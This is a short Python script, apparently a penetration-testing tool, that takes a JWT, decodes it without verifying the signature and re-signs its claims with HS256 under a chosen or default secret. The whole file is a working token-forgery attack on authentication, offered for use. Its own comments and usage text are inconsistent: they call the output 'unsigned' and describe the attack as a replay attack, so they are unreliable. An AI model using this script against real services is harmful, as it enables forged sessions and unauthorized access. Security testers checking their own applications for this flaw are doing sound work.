# jwt-any-to-hs256.py
# Generate a signed JWT by HS256 algorithm based on a different JWT.
# If it's accepted, then the application should be vulnerable to replay-attacks.

import jwt
import sys


def main():
    if len(sys.argv) <= 1:
        sys.stdout.write("\t-::: jwt-mimicker.py :::-\n")
        sys.stdout.write("# Generate an unsigned jwt based on a valid token.\n")
        sys.stdout.write(
            "# If it's accepted, then the application should be vulnerable to replay-attacks.\n")
        sys.stdout.write("\nUsage: %s [jwt-token] [optional: new secret key]\n" % (sys.argv[0]))
        sys.stdout.flush()
        exit(0)

    jwt_token = sys.argv[1]
    jwt_token_value = jwt.decode(jwt_token, verify=False)
    if len(sys.argv) >= 3:
        new_secret_key = sys.argv[2]
    else:
        new_secret_key = "jwt"
    new_jwt_token = jwt.encode(jwt_token_value, new_secret_key, algorithm="HS256")
    new_jwt_token = new_jwt_token.decode("utf-8")

    sys.stdout.write("\n\n[#] Generated JWT:\n%s\n" % (new_jwt_token))
    sys.stdout.flush()
    exit(0)


if __name__ == "__main__":
    main()
